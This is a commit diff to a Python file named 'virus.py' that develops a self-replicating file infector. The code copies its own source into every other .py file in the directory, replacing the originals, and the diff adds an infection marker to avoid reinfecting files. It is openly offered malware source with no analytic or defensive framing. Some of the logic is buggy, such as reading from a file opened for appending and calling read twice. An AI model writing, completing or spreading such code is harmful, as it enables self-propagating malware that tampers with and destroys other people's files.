updated replicating function

+++ virus.py
@@ -12,7 +12,16 @@ def create_checksum(filename):
     hasher = hashlib.md5()
     with open(filename,'rb') as file:
         hasher.update(file.read())
-    print(hasher.hexdigest())
+    return hasher.hexdigest()
+
+def watermark():
+    for file in glob.glob("*.py"):
+        if file == __file__:
+            continue
+        append = open(file,'a')
+        if append.mode == 'a':
+            if '###' not in append.read():
+                append.write("###" + create_checksum(file))
 
 def infect(PAYLOAD):
     i = 0
@@ -21,13 +30,15 @@ def infect(PAYLOAD):
             continue
         f = open(file, "r")
         if f.mode == 'r':
-            infected = open('infected_'+str(i)+'.py','w')
-            infected.write(f.read() + PAYLOAD)
-            f.close()
-            infected.close()
-            os.remove(file)
-            os.rename('infected_'+str(i)+'.py',file)
-            i = i + 1
+            if '###' not in f.read():
+                infected = open('infected_'+str(i)+'.py','w')
+                infected.write(f.read() + PAYLOAD)
+                f.close()
+                infected.close()
+                os.remove(file)
+                os.rename('infected_'+str(i)+'.py',file)
+                i = i + 1
+    watermark()
             
 
 
@@ -35,4 +46,8 @@ def infect(PAYLOAD):
 with open(__file__,'r') as current_file:
     PAYLOAD = current_file.read()
 
+Beep(FREQ,DUR)
 infect(PAYLOAD)
+
+
+
